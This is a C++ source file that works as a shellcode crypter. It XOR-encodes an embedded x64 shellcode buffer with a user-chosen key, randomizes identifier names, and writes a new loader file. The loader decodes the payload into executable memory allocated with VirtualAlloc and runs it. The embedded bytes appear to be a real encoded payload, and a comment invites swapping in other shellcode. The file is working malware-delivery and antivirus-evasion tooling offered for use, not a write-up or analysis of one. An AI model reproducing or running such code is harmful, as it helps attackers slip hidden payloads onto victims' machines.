#include "Windows.h"
#include "iostream"
#include <fstream>
#include <string>
#include <time.h>
#include <stdlib.h>


using namespace std;




string randString(int size){
	string a;
	for(int i = 0; i < size; i++)
	{
		int asc_value = rand() % 122 + 65;
		if( (asc_value <= 90 && asc_value >= 65)  || (asc_value >= 97 && asc_value <= 122))
		a +=  (char)asc_value;
		else
		i--;
		
	}
	
return a;	
}


void creator(string fName, string aName, unsigned char *shelly, int s_c, string key, string kName){
	ofstream cout("flip-obfuscated.cpp");
	
	unsigned char encodedShelly[s_c];
	cout << "#include \"Windows.h\"" << endl;
		cout << "#include <string>" << endl;
	cout << "using namespace std;" << endl;
	for(int i = 0; i < 10; i++)
		cout << endl;
	cout << "int main(){" << endl << endl;
	cout << "string "<<kName <<"="<<"\"" << key << "\"" <<";" << endl << endl; 
	cout << "char "<<aName <<"[]" <<" = " << "\"";
	
	int j =0;
	for(int i = 0; i < s_c; i++)
	{
		if(j >= key.size() -1)
			j=0;
			
		encodedShelly[i] = shelly[i] ^ key[j];
		
	
		j++;
	}
	
		for(int i = 0; i < s_c; i++)
	{
		cout <<"\\x"<< hex << (int)encodedShelly[i];
	}
	
	
	
	cout << "\";";
	
	
	cout << endl << endl << endl;
	cout << "int j = 0;" << endl;
	cout << "for(int i=0; i < sizeof " << aName << "; i++){" << endl;
	cout << "if(j == "<< kName << ".size()" <<" -1) j=0;" << endl;
	cout << aName << "[" << "i" << "]" << " = " << aName << "[" << "i" << "]" << "^" << kName <<"[j]" << ";" << endl;
	cout <<"j++;";
	cout << "}";
	cout << endl << endl;
	cout << "void *" <<fName <<" = VirtualAlloc(0, " <<"sizeof " <<aName << ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);" << endl;
	cout << "memcpy(" << fName << ", " << aName << ", sizeof "<<aName << ");" << endl ;
	
	cout << "((void(*)())"<<fName<<")()"<<";"<< endl;
	cout << "}";

	
	
	
	
	
}




int main()
{
 //::ShowWindow(::GetConsoleWindow(), SW_HIDE);
unsigned seed = time(0);
srand(seed);


int funcNameSize = rand() % 15 + 5;
string funcName = randString(funcNameSize);

int arrNameSize = rand() % 13+7;
string arrName = randString(arrNameSize);

int keyNameSize = rand() % 19+7;
string keyName = randString(keyNameSize);

int ptrNameSize = rand() % 25+5;
string ptrName = randString(ptrNameSize);

cout << "Encoding Key= ";
string encodeKey;
cin >> encodeKey;

//Replace here with ur shellcode
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x97\x9c\xb2\xeb\x1a\xab\x61\x9f\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x6b\xd4\x31\x0f\xea\x43"
"\xad\x9f\x97\x9c\xf3\xba\x5b\xfb\x33\xce\xc1\xd4\x83\x39\x7f"
"\xe3\xea\xcd\xf7\xd4\x39\xb9\x02\xe3\xea\xcd\xb7\xd4\x39\x99"
"\x4a\xe3\x6e\x28\xdd\xd6\xff\xda\xd3\xe3\x50\x5f\x3b\xa0\xd3"
"\x97\x18\x87\x41\xde\x56\x55\xbf\xaa\x1b\x6a\x83\x72\xc5\xdd"
"\xe3\xa3\x91\xf9\x41\x14\xd5\xa0\xfa\xea\xca\xcd\xe0\xe7\x8f"
"\x97\xb0\xe4\x9f\xd9\x61\x9f\x97\x17\x32\x63\x1a\xab\x61\xd7"
"\x12\x5c\xc6\x8c\x52\xaa\xb1\xcf\x1c\xd4\xaa\xaf\x91\xeb\x41"
"\xd6\x96\x4c\x51\xbd\x52\x54\xa8\xde\x1c\xa8\x3a\xa3\x1b\x7d"
"\x2c\xae\x5e\xd4\x83\x2b\xb6\xea\xa0\x56\x9a\xdd\xb3\x2a\x22"
"\x4b\x14\x6e\xdb\x9f\xfe\xcf\x12\xee\x58\x4e\xe2\x44\xea\xaf"
"\x91\xeb\x45\xd6\x96\x4c\xd4\xaa\x91\xa7\x29\xdb\x1c\xdc\xae"
"\xa2\x1b\x7b\x20\x14\x93\x14\xfa\xea\xca\xea\x39\xde\xcf\xc2"
"\xeb\xb1\x5b\xf3\x20\xc6\xd6\xc6\xfa\x68\xf6\x8b\x20\xcd\x68"
"\x7c\xea\xaa\x43\xf1\x29\x14\x85\x75\xf9\x14\xe5\x54\x3c\xd6"
"\x29\xeb\xc1\xd9\x45\x98\x53\x9f\x97\xdd\xe4\xa2\x93\x4d\x29"
"\x1e\x7b\x3c\xb3\xeb\x1a\xe2\xe8\x7a\xde\x20\xb0\xeb\x13\x61"
"\xa1\x37\x74\x0b\xf3\xbf\x53\x22\x85\xd3\x1e\x6d\xf3\x51\x56"
"\xdc\x47\x98\x68\x49\xfe\x62\xf0\xc3\x60\x9e\x97\x9c\xeb\xaa"
"\xa0\x82\xe1\xf4\x97\x63\x67\x81\x10\xea\x3f\xcf\xc7\xd1\x83"
"\x22\x57\x9a\xa1\xd7\x68\x5c\xfa\x62\xd8\xe3\x9e\x5f\xdf\x15"
"\x73\xaa\xa0\x41\x6e\x40\x77\x63\x67\xa3\x93\x6c\x0b\x8f\xd6"
"\xc4\xfe\x62\xf8\xe3\xe8\x66\xd6\x26\x2b\x4e\x6e\xca\x9e\x4a"
"\x12\x5c\xc6\xe1\x53\x54\xaf\xea\x72\x74\x21\xeb\x1a\xab\x29"
"\x1c\x7b\x8c\xfa\x62\xf8\xe6\x50\x56\xfd\x98\xf3\xb3\x52\x22"
"\x98\xde\x2d\x9e\x6b\x23\x45\x54\xb4\x1c\x6f\x9c\xcc\xbe\x52"
"\x28\xa5\xbf\xc9\x15\x44\x81\x5a\xea\x38\xf7\x97\x8c\xb2\xeb"
"\x5b\xf3\x29\x16\x65\xd4\x83\x22\x5b\x11\x39\x3b\xc4\x79\x4d"
"\x3e\x52\x22\xa2\xd6\x1e\x5b\xff\xda\xd3\xe2\xe8\x6f\xdf\x15"
"\x68\xa3\x93\x52\x20\x25\x95\x45\x7a\xb4\xe5\x7e\xe2\x67\x97"
"\xe1\x9a\xb3\x5b\xfc\x38\xf7\x97\xdc\xb2\xeb\x5b\xf3\x0b\x9f"
"\xcd\xdd\x08\xe0\x35\xa4\x51\x60\x42\xcb\xeb\xaa\xa0\xde\x0f"
"\xd2\xf6\x63\x67\xa2\xe5\x65\x88\xa3\x68\x63\x4d\xa3\x1b\x68"
"\x29\xb6\x51\xd4\x37\x1d\x6f\x1f\x20\x60\x70\xc4\xd8\xeb\x43"
"\xe2\xa6\x5d\x67\x29\x10\xbd\xe5\x7e\x61\x9f";

creator(funcName, arrName, buf, sizeof buf, encodeKey, keyName);

  


}
